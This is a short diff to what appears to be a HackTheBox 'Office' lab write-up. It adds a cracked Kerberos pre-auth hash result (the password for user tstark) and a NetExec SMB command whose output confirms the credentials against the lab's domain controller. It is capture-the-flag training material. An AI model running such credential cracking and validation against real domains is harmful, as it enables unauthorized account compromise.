@@ -451,5 +451,15 @@ $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a41445941761
 ```
 I have cracked the hash!
 
-```oyth
+```python
+tstark:playboy69
 ```
+Ill verify these credentials
+
+```python
+nxc smb dc.office.htb -u tstark -p 'playboy69'                           
+SMB         10.129.230.226  445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:None)
+SMB         10.129.230.226  445    DC               [+] office.htb\tstark:playboy69
+```
+This user is compromised
+
